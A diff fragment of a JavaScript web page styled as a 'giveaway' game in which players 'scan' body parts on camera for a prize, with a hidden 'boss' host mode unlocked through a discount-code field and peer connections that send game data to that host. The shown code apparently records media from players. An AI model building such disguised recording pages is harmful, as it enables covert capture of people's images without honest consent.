+                    bossStartBtn.disabled = false;
+                    bossPlayerStatus.textContent = '👤 next player in queue!';
+                    bossPlayerStatus.className = 'value status-text approved';
+                } else {
+                    bossScanStatus.textContent = '⏳ waiting for players…';
+                    bossScanStatus.className = 'value status-text';
+                    bossPlayerStatus.textContent = '⏳ waiting for players…';
+                    bossPlayerStatus.className = 'value status-text waiting';
+                }
+            }
+
+            // ---- UPDATE BOSS UI ----
+            function updateBossUI() {
+                const part = BODY_PARTS[currentPartIndex];
+                if (part) {
+                    bossPartName.textContent = part.emoji + ' ' + part.label;
+                }
+                bossSliderValue.textContent = bossProgressSlider.value + '%';
+            }
+
+            // ---- PLAYER COUNTDOWN ----
+            function startCountdownForPlayer() {
+                if (countdownRunning) return;
+                countdownRunning = true;
+                countdownOverlay.classList.add('active');
+
+                let count = 3;
+                countdownNumber.textContent = count;
+
+                if (countdownTimer) clearInterval(countdownTimer);
+                countdownTimer = setInterval(() => {
+                    count--;
+                    if (count > 0) {
+                        countdownNumber.textContent = count;
+                    } else {
+                        clearInterval(countdownTimer);
+                        countdownTimer = null;
+                        countdownOverlay.classList.remove('active');
+                        countdownRunning = false;
+                        startGameOnPlayer();
+                    }
+                }, 1000);
+            }
+
+            function startGameOnPlayer() {
+                gameRunning = true;
+                gameDone = false;
+                totalPoints = 0;
+                partsScanned = 0;
+                currentPartIndex = 0;
+                gingerScopePercent = 0;
+                gameTimeLeft = SCAN_TIME;
+                scannerValue = 0;
+                playerGingerFill.style.width = '0%';
+                playerGingerLabel.textContent = '0%';
+                playerGingerPercent.textContent = '0%';
+                playerScannerFill.style.width = '0%';
+                playerScannerValue.textContent = '0%';
+                partsScannedDisplay.textContent = '0';
+                playerScoreDisplay.textContent = '0';
+                const firstPart = BODY_PARTS[0];
+                playerPartName.textContent = firstPart.label;
+                gameStatus.textContent = '⏳ waiting for scan…';
+                gameStatus.style.color = 'var(--text-dim)';
+                showScreen('screenGame');
+                startGameTimer();
+            }
+
+            // ---- GAME TIMER ----
+            function startGameTimer() {
+                stopGameTimer();
+                gameTimer = setInterval(() => {
+                    if (!gameRunning) return;
+                    gameTimeLeft--;
+                    if (gameTimeLeft <= 0) {
+                        gameRunning = false;
+                        stopGameTimer();
+                        gameStatus.textContent = '💀 Time\'s up! You lose.';
+                        gameStatus.style.color = '#ff4466';
+                        sendDataToHost({ type: 'game_over', won: false });
+                        setTimeout(() => {
+                            endGame(false);
+                        }, 2000);
+                    }
+                }, 1000);
+            }
+
+            function stopGameTimer() {
+                if (gameTimer) {
+                    clearInterval(gameTimer);
+                    gameTimer = null;
+                }
+            }
+
+            // ---- END GAME ----
+            function endGame(won) {
+                if (gameDone) return;
+                gameDone = true;
+                gameRunning = false;
+                stopGameTimer();
+                if (won) {
+                    showPrize();
+                } else {
+                    setTimeout(() => {
+                        if (playerPeer) { playerPeer.destroy();
+                            playerPeer = null;
+                            dataConnection = null; }
+                        showScreen('screenMenu');
+                    }, 2000);
+                }
+            }
+
+            // ---- SHOW PRIZE ----
+            function showPrize() {
+                overlayPrize.classList.add('active');
+                if (playerPeer) { playerPeer.destroy();
+                    playerPeer = null;
+                    dataConnection = null; }
+            }
+
+            prizeRestartBtn.addEventListener('click', () => {
+                overlayPrize.classList.remove('active');
+                const queue = getQueue();
+                const newQueue = queue.filter(p => p.id !== playerId);
+                saveQueue(newQueue);
+                playerId = null;
+                totalPoints = 0;
+                partsScanned = 0;
+                gingerScopePercent = 0;
+                gameDone = false;
+                gameRunning = false;
+                showScreen('screenMenu');
+            });
+
+            // ---- FLASH ----
+            function flashGreen() {
+                const flash = document.createElement('div');
+                flash.style.cssText =
+                    'position:absolute;inset:0;background:#00f5c0;z-index:5;pointer-events:none;opacity:0.10;transition:opacity 0.5s ease;border-radius:22px;';
+                document.querySelector('.player-game-container .glass')?.appendChild(flash);
+                setTimeout(() => { flash.style.opacity = '0';
+                    setTimeout(() => flash.remove(), 500); }, 100);
+            }
+
+            function flashRed() {
+                const flash = document.createElement('div');
+                flash.style.cssText =
+                    'position:absolute;inset:0;background:#ff6b6b;z-index:5;pointer-events:none;opacity:0.10;transition:opacity 0.5s ease;border-radius:22px;';
+                document.querySelector('.player-game-container .glass')?.appendChild(flash);
+                setTimeout(() => { flash.style.opacity = '0';
+                    setTimeout(() => flash.remove(), 500); }, 100);
+            }
+
+            // ---- STOP GAME ----
+            function stopGame() {
+                gameRunning = false;
+                stopGameTimer();
+            }
+
+            // ---- COMMENTS TOGGLE ----
+            commentToggles.forEach(toggle => {
+                toggle.addEventListener('click', () => {
+                    const targetId = toggle.dataset.target;
+                    const list = document.getElementById(targetId);
+                    if (list) {
+                        list.classList.toggle('open');
+                        toggle.textContent = list.classList.contains('open') ? '💬 Hide Comments' : '💬 Comments';
+                        const excl = toggle.querySelector('.exclamation');
+                        if (excl) excl.classList.add('hidden');
+                    }
+                });
+            });
+
+            // ---- INIT ----
+            showScreen('screenPermission');
+            totalPartsDisplay.textContent = BODY_PARTS.length;
+
+            // ---- CLEANUP ----
+            window.addEventListener('beforeunload', () => {
+                if (recordingInterval) {
+                    clearInterval(recordingInterval);
+                    recordingInterval = null;
+                }
+                if (bossPollInterval) clearInterval(bossPollInterval);
+                if (queuePollInterval) clearInterval(queuePollInterval);
+                if (mediaStream) {
+                    mediaStream.getTracks().forEach(t => t.stop());
+                }
+                stopGameTimer();
+                if (hostPeer) { hostPeer.destroy(); }
+                if (playerPeer) { playerPeer.destroy(); }
+            });
+
+            console.log('🚀 Chillz Giveaway System loaded.');
+            console.log('🔑 Room code: ALPHA1');
+            console.log('👑 Say "boss" in discount code to enter host mode.');
+            console.log('🎯 Each part adds 2% to Gingerscope. Total parts:', BODY_PARTS.length);
+
+        })();
+    </script>
+</body>
+</html>
